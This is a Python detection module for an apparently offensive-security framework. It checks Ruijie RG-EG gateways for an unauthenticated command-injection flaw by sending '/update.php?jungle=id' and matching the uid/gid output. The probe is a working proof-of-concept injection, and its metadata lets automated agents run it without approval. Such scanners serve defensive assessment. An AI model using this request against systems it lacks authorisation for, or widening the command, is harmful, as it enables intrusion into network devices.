#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ruijie RG-EG easy gateway WEB management system front-end RCE has a command execution vulnerability."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ruijie RG-EG - Remote Code Execution Detection',
        'description': 'Ruijie RG-EG easy gateway WEB management system front-end RCE has a command execution vulnerability. An attacker without identity authentication can execute arbitrary commands to control server permissions.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'ruijie', 'router', 'iot', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/xinyisleep/pocscan/blob/main/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7_EG%E6%98%93%E7%BD%91%E5%85%B3_WEB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F_%E5%89%8D%E5%8F%B0RCE.py',
        ],
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('ruijie',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/update.php?jungle=id'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='Ruijie RG-EG - Remote Code Execution detected', path=path)
            return True
        return False

